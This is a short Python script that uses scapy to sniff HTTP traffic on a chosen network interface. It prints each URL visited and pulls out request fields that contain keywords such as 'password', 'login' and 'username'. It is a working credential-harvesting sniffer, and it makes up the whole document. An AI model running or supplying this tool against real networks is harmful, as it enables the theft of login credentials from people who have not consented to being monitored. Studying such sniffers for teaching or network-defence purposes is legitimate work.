

import scapy.all as scapy
from termcolor import colored
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_packets)

def process_packets(packet):
    if(packet.haslayer(http.HTTPRequest)):
        url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(colored('Url visited '+url.decode(),'green'),end='   ')
        if(packet.haslayer(scapy.Raw)):
            load=packet[scapy.Raw].load
            for i in words:
                if i in str(load):
                  #  print(colored('  ==> '+load.decode(),'red'))
                    l=str(load.decode())
                    l1=l.split('&')
                    print(colored('  ==>   '+str(l1[:2]),'red'))
                    print()
                    break



words=['password','Password','login','Login','User','user','Username','username']
i=input('Enter the interface > ')
sniff(i)
